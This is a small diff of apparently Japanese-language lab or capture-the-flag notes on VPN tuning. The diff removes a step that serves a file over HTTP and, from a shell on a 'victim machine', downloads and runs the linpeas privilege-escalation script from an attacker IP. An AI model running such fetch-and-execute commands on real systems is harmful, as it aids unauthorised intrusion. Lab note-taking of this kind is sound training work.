@@ -12,12 +12,3 @@ sudo ip link set dev tun0 mtu 1200
 ②VPNをUDP→TCP
 
 
-
-# HTTP サーバーを起動
-python3 -m http.server 8080
-
-被害マシン（www-data のシェル）から取得：
-bashcd /tmp
-wget http://10.10.16.166:8080/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
